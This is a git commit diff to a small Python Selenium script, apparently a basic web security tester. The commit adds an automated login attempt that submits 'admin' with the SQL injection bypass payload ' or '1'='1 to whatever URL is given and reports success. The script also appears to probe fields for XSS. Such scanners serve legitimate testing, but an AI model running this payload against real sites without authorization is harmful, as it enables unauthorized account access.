d9b234eb2d64d384b1170b3a19bbf701f78e0b0b
Meenakshi Sivapriya Manikandaswamy <meenakshisivapriyamanikandaswamy@Meenakshis-MacBook-Air.local>
2024-02-07 15:35:01 -0500

    SQLi tests

--- awsat.py
+++ awsat.py
@@ -4,11 +4,32 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import TimeoutException
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
 
 user_url = sys.argv
 driver = webdriver.Chrome()
 driver.get(user_url[1])
+
+try:
+	uname_element = driver.find_element(By.NAME, "uid")
+	print("Number of username elements: 1")
+except NoSuchElementException:
+	print("Number of username elements: 0")
+try:
+	passwd_element = driver.find_element(By.XPATH, "//input[@type='password']")
+	print("Number of password elements: 1")
+
+	uname_element.send_keys("admin")
+	passwd_element.send_keys("' or '1'='1")
+	passwd_element.send_keys(Keys.RETURN)
+except NoSuchElementException:
+	print("Number of password elements: 0")
+try:
+	driver.find_element(By.XPATH, "//input[@type='password']")
+except NoSuchElementException:
+	print("***************************Basic SQL Injection successfully executed!*************************************")
+print("Basic SQL Injection tests completed. Check the report for more detailed analysis")
+
 input_elements = driver.find_elements(By.XPATH, "//input")
 text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
 print("Number of input elements: ", len(input_elements))
@@ -28,5 +49,7 @@ for element in input_elements:
 		print("***************************Basic XSS successfully executed!*************************************")
 		break
 	except TimeoutException:
-		print("Basic XSS tests passed. Check the report for more detailed analysis")
+		print("No alert")
+print("Basic XSS tests completed. Check the report for more detailed analysis")
+
 driver.close()
